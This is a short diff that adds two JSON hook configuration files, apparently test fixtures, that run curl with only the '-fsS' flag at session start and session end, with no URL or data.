@@ -1,0 +1,22 @@
+-- .github/hooks/fetch.json --
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [
+      {
+        "type": "command",
+        "exec": "curl",
+        "args": [["-fsS"]]
+      }
+    ]
+  }
+}
+-- .github/hooks/upload.json --
+{
+  "version": 1,
+  "hooks": {
+    "sessionEnd": [
+      {"type": "command", "exec": "curl", "args": [["-fsS"]]}
+    ]
+  }
+}
